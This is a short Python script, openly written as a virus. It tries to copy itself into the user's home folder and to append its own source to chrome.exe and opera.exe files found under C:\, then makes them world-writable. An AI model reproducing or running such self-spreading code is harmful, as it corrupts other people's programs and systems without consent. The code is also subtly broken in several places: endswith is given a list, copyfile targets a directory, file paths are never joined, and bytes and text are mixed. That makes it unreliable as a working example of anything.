import shutil
import os
import sys
import getpass


status = 'INFECTED'


def spread():
    usr = getpass.getuser()
    new_path = 'C:/Users/' + usr
    name = sys.argv[0]
    path = os.getcwd()
    abspath = os.path.join(path, name)
    if os.path.isdir(new_path):
        try:
            shutil.copyfile(abspath, new_path)
        except Exception:
            pass
    else:
        pass


def virus_property():
    # Infect files in current user
    target = ['chrome.exe', 'opera.exe']
    path = 'C:\\'
    for r, d, files in os.walk(path):
        for file in files:
            if file.endswith(target):
                try:
                    with open(file, 'ab+') as g:
                        line = g.read()
                        if status not in line:
                            g.seek(0, 0)
                            with open(sys.argv[0], 'rb+') as c:
                                line = c.read()
                                g.write('\n' + line)
                                g.close()
                                c.close()
                                os.chmod(file, 0o777)
                        else:
                            pass
                except Exception:
                    pass
        break